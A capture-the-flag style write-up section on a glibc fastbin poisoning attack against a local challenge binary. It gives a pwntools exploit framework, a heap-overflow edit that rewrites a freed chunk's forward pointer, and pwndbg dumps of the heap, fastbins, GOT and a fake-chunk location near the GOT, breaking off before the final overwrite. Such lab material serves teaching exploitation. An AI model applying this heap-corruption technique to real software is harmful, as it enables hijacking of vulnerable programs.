## 4.1.3 heap fastbins attack

Write basic framework
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
context.binary = './pwn'
elf = context.binary
libc = elf.libc
p = process('./pwn')

def show():
    p.sendlineafter(':', '1')

def add(length, name):
    p.sendlineafter(':', '2')
    p.sendlineafter(':', str(length))
    p.sendafter(':', name)
    sleep(0.01)

def edit(idx, length, name):
    p.sendlineafter(':', '3')
    p.sendlineafter(':', str(idx))
    p.sendlineafter(':', str(length))
    p.sendafter(':', name)
    sleep(0.01)

def delete(idx):
    p.sendlineafter(':', '4')
    p.sendlineafter(':', str(idx))

p.interactive()
```
add 2 chunks, free chuck2, edit chunk1(heap overflow) to change the fd
```python
add(0x50, '000000')
add(0x50, '111111')

delete(1)
pause()
edit(0, 0x100, flat('x' * 0x50, 0, 0x61, 0xdeadbeef))
delete(2)
```
gdb break set to the read function in edit
``` gdb -q -p `pidof pwn` -ex "b *0x400C05" -ex "c"```
before edit, chunk2 is freed, to fastbin
```
pwndbg> heapbase
heapbase : 0x727000
pwndbg> x/40gx 0x727000
0x727000:	0x0000000000000000	0x0000000000000021
0x727010:	0x0000000000400896	0x00000000004008b1
0x727020:	0x0000000000000000	0x0000000000000061
0x727030:	0x0000303030303030	0x0000000000000000
0x727040:	0x0000000000000000	0x0000000000000000
0x727050:	0x0000000000000000	0x0000000000000000
0x727060:	0x0000000000000000	0x0000000000000000
0x727070:	0x0000000000000000	0x0000000000000000
0x727080:	0x0000000000000000	0x0000000000000061
0x727090:	0x0000000000000000	0x0000000000000000
0x7270a0:	0x0000000000000000	0x0000000000000000
0x7270b0:	0x0000000000000000	0x0000000000000000
0x7270c0:	0x0000000000000000	0x0000000000000000
0x7270d0:	0x0000000000000000	0x0000000000000000
0x7270e0:	0x0000000000000000	0x0000000000020f21
0x7270f0:	0x0000000000000000	0x0000000000000000
0x727100:	0x0000000000000000	0x0000000000000000
0x727110:	0x0000000000000000	0x0000000000000000
0x727120:	0x0000000000000000	0x0000000000000000
0x727130:	0x0000000000000000	0x0000000000000000
pwndbg> fastbins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x727080 ◂— 0x0
0x70: 0x0
0x80: 0x0
pwndbg> p main_arena.fastbinsY
$1 = {0x0, 0x0, 0x0, 0x0, 0x727080, 0x0, 0x0, 0x0, 0x0, 0x0}
```
after edit, 0xdeadbeef is added to fastbin
```
pwndbg> ni
pwndbg> x/40gx 0x727000
0x727000:	0x0000000000000000	0x0000000000000021
0x727010:	0x0000000000400896	0x00000000004008b1
0x727020:	0x0000000000000000	0x0000000000000061
0x727030:	0x7878787878787878	0x7878787878787878
0x727040:	0x7878787878787878	0x7878787878787878
0x727050:	0x7878787878787878	0x7878787878787878
0x727060:	0x7878787878787878	0x7878787878787878
0x727070:	0x7878787878787878	0x7878787878787878
0x727080:	0x0000000000000000	0x0000000000000061
0x727090:	0x00000000deadbeef	0x0000000000000000
0x7270a0:	0x0000000000000000	0x0000000000000000
0x7270b0:	0x0000000000000000	0x0000000000000000
0x7270c0:	0x0000000000000000	0x0000000000000000
0x7270d0:	0x0000000000000000	0x0000000000000000
0x7270e0:	0x0000000000000000	0x0000000000020f21
0x7270f0:	0x0000000000000000	0x0000000000000000
0x727100:	0x0000000000000000	0x0000000000000000
0x727110:	0x0000000000000000	0x0000000000000000
0x727120:	0x0000000000000000	0x0000000000000000
0x727130:	0x0000000000000000	0x0000000000000000
pwndbg> fastbins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x727080 ◂— 0xdeadbeef
0x70: 0x0
0x80: 0x0
pwndbg> p main_arena.fastbinsY
$2 = {0x0, 0x0, 0x0, 0x0, 0x727080, 0x0, 0x0, 0x0, 0x0, 0x0}
```
then malloc twice, 0xdeadbeef is returned, need to set 0xdeadbeef to a useful address.
got is changable
```
pwndbg> checksec
[*] '/root/ctf/1/pwn'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
check the got table
```
pwndbg> got

GOT protection: Partial RELRO | GOT functions: 12
 
[0x602018] free@GLIBC_2.2.5 -> 0x7f2455ffd540 (free) ◂— push   r13
[0x602020] puts@GLIBC_2.2.5 -> 0x7f2455fe86a0 (puts) ◂— push   r12
[0x602028] __stack_chk_fail@GLIBC_2.4 -> 0x4006f6 (__stack_chk_fail@plt+6) ◂— push   2
[0x602030] printf@GLIBC_2.2.5 -> 0x7f2455fce810 (printf) ◂— sub    rsp, 0xd8
[0x602038] close@GLIBC_2.2.5 -> 0x400716 (close@plt+6) ◂— push   4
[0x602040] read@GLIBC_2.2.5 -> 0x7f2456070310 (read) ◂— cmp    dword ptr [rip + 0x2d2429], 0
[0x602048] __libc_start_main@GLIBC_2.2.5 -> 0x7f2455f99750 (__libc_start_main) ◂— push   r14
[0x602050] malloc@GLIBC_2.2.5 -> 0x7f2455ffd180 (malloc) ◂— push   rbp
[0x602058] setvbuf@GLIBC_2.2.5 -> 0x7f2455fe8e80 (setvbuf) ◂— push   rbp
[0x602060] open@GLIBC_2.2.5 -> 0x400766 (open@plt+6) ◂— push   9 /* 'h\t' */
[0x602068] atoi@GLIBC_2.2.5 -> 0x7f2455fafe90 (atoi) ◂— sub    rsp, 8
[0x602070] exit@GLIBC_2.2.5 -> 0x400786 (exit@plt+6) ◂— push   0xb /* 'h\x0b' */
```
find valid size before got
```
pwndbg> x/40gx 0x602018-0x40
0x601fd8:	0x0000000000000000	0x0000000000000000
0x601fe8:	0x0000000000000000	0x0000000000000000
0x601ff8:	0x0000000000000000	0x0000000000601e28
0x602008:	0x00007f245656a168	0x00007f245635ae40
0x602018:	0x00007f2455ffd540	0x00007f2455fe86a0
0x602028:	0x00000000004006f6	0x00007f2455fce810
0x602038:	0x0000000000400716	0x00007f2456070310
0x602048:	0x00007f2455f99750	0x00007f2455ffd180
0x602058:	0x00007f2455fe8e80	0x0000000000400766
0x602068:	0x00007f2455fafe90	0x0000000000400786
0x602078:	0x0000000000000000	0x0000000000000000
0x602088:	0x0000000000000000	0x0000000000000000
0x602098:	0x0000000000000000	0x00007f245633e620
0x6020a8:	0x0000000000000000	0x00007f245633d8e0
0x6020b8 <completed.7594>:	0x0000000000000000	0x0000000000000050
0x6020c8 <itemlist+8>:	0x0000000000e14030	0x0000000000000000
0x6020d8 <itemlist+24>:	0x0000000000000000	0x0000000000000000
0x6020e8 <itemlist+40>:	0x0000000000000000	0x0000000000000000
0x6020f8 <itemlist+56>:	0x0000000000000000	0x0000000000000000
0x602108 <itemlist+72>:	0x0000000000000000	0x0000000000000000
```
0x0x601ffa is OK
```
pwndbg> x/4gx 0x601ffa
0x601ffa:	0x1e28000000000000	0xa168000000000060
0x60200a:	0xae4000007f245656	0xd54000007f245635
```
